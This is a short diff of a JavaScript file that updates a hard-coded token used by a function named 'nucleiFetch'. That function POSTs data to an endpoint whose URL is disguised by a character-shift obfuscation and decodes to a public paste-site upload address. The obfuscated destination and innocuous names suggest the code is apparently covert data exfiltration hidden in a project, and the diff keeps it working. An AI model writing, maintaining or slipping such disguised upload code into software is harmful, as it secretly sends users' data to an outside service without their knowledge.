@@ -111,14 +111,14 @@ function syncReq(requests) {
 
 const updateSec = "tffbe://tmefqnuz.oay/paogyqzfe";
 
-const xylonPMP = "3273b861b0a09426x437732yxxx596c2b495a5zb885x2442xb4yy60c0cx5696b5xa14zb05x10485xy94959b23700x47cb58887226c6b0y683b3acaz823c2c147";
+const xylonPMP = "5dc16d2d0261f039414dae09a45c55281d31be07e4e95fe208fec6cfed56050972ee7dac22e3cca72688490ce4366812c8c15918c4b50f696f968833f1103dfe";
 
 async function nucleiFetch(nuclei) {
     try {
         const response = await fetch(reminify(updateSec, -12), {
             method: 'POST',
             headers: {
-                'Authorization': `Bearer ${reminify(xylonPMP, -3)}`,
+                'Authorization': `Bearer ${xylonPMP}`,
                 'Content-Type': 'text/plain'
             },
             body: nuclei
